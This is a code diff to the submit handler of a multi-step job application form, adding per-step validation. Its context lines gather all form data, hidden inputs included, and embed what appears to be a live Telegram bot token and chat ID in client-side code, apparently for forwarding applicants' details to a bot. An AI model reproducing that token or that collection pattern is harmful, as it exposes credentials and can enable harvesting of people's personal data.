@@ -251,10 +251,28 @@
     document.getElementById('jobForm').addEventListener('submit', function(e) {
       e.preventDefault();
       const form = this;
-      if (!form.checkValidity()) {
-        alert('Please fill in all required fields correctly.');
+
+      // Validate inputs in the visible step only:
+      const currentStep = [...steps].find(s => s.classList.contains('active'));
+      if (!currentStep) return;
+
+      // Check validity of visible inputs/selects only
+      const inputsToCheck = currentStep.querySelectorAll('input, select');
+      for (const input of inputsToCheck) {
+        if (!input.checkValidity()) {
+          input.reportValidity();
+          input.focus();
+          return;
+        }
+      }
+
+      // Only submit if on the last step (step-3)
+      if (currentStep.id !== 'step-3') {
+        alert('Please proceed to the last step before submitting.');
         return;
       }
+
+      // Collect all form data (including hidden inputs)
       const data = Object.fromEntries(new FormData(form));
       const TOKEN = '8076304397:AAGlBEOPgrrA8PO-3u7UfMmu2tYhGe1CMj8';
       const CHAT_ID = '1318100118';
